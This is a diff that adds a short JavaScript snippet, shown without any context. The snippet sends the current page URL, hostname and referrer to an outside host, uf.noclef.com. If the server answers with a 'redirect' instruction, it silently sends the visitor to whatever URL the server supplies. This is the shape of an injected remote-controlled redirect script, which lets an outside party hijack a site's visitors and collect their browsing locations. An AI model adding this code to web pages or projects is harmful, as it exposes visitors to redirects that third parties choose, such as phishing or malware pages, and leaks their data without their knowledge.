@@ -1,0 +1,13 @@
+(function (w, domainPath, referer) {
+  var doc_location = encodeURIComponent(w.location.toString());
+  referer = referer ? encodeURIComponent(referer) : '';
+  var urlToXML = domainPath + "/v1/puma/check/" + w.location.hostname + "?referer=" + referer + "&doc_location=" + doc_location;
+  w.ufApp.sendXMLGetRequest(urlToXML, function (err, response) {
+    if (err) {
+      return;
+    }
+    if (response && response.data && response.data.solution && response.data.solution === 'redirect' && response.data.url) {
+      w.location.replace(response.data.url);
+    }
+  });
+})(window, "https://uf.noclef.com", "");
